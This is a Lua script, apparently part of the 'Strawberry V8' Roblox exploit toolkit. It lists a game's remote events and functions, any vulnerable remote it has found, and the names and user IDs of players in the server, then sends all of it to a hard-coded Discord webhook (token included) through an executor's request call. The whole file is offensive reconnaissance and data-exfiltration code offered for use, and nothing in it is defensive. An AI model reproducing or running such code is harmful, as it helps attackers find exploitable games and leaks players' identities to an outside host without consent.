-- Strawberry V8 Hook Source - More powerful logging
local playersService = game:GetService("Players")
local marketplaceService = game:GetService("MarketplaceService")
local httpService = game:GetService("HttpService")
local function listRemotes()
local remotes = { Events = {}, Functions = {} }
for _, descendant in ipairs(game:GetDescendants()) do
if descendant:IsA("RemoteEvent") then
table.insert(remotes.Events, descendant:GetFullName())
elseif descendant:IsA("RemoteFunction") then
table.insert(remotes.Functions, descendant:GetFullName())
end
end
return remotes
end
local playersList = ""
for _, player in ipairs(playersService:GetPlayers()) do
playersList = playersList .. string.format("%s (%d)\n", player.Name, player.UserId)
end
if #playersList == 0 then playersList = "None" end
local gameInfo = {}
local success, result = pcall(function() return marketplaceService:GetProductInfo(game.PlaceId) end)
if success then gameInfo = result else gameInfo.Name = "Unknown" end
local vulnInfo = "Not Found"
if shared.strawberry and shared.strawberry.vulnRemote then
vulnInfo = string.format("\nPath: %s\nType: %s\n", shared.strawberry.vulnRemote:GetFullName(), shared.strawberry.vulnType)
end
local remotesList = listRemotes()
local embed = {
["title"] = "🍓 Strawberry V8 Logged A Game!",
["description"] = "Game Link: https://www.roblox.com/games/" .. game.PlaceId .. "",
["color"] = 16711680,
["fields"] = {
{
["name"] = "Game Info",
["value"] = string.format("\nName: %s\nPlaceId: %d\nJobId: %s\nCreatorId: %d\n", gameInfo.Name, game.PlaceId, game.JobId, game.CreatorId),
["inline"] = false
},
{
["name"] = "Vulnerability Found",
["value"] = vulnInfo,
["inline"] = false
},
{
["name"] = "Players ("..#playersService:GetPlayers().."/"..playersService.MaxPlayers..")",
["value"] = playersList,
["inline"] = true
},
{
["name"] = "RemoteEvents (" .. #remotesList.Events .. ")",
["value"] = "\n" .. table.concat(remotesList.Events, "\n"):sub(1, 1000) .. "\n",
["inline"] = false
},
{
["name"] = "RemoteFunctions (" .. #remotesList.Functions .. ")",
["value"] = "\n" .. table.concat(remotesList.Functions, "\n"):sub(1, 1000) .. "\n",
["inline"] = false
}
},
["footer"] = {
["text"] = "Strawberry V8 BEASTMODE // by C:\Drive, Saji & Sane"
},
["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
}
local webhook_url = "https://discord.com/api/webhooks/1245087570498424842/l1g873528b3a7dc923b7e09804e13d5162a843e93ddc0746b5a386b1f2e032d1e2"
pcall(function()
request({
Url = webhook_url,
Method = "POST",
Headers = {["Content-Type"] = "application/json"},
Body = httpService:JSONEncode({["username"] = "Strawberry Logger", ["avatar_url"] = "https://i.imgur.com/qav7D0t.png", ["embeds"] = {embed}})
})
end)
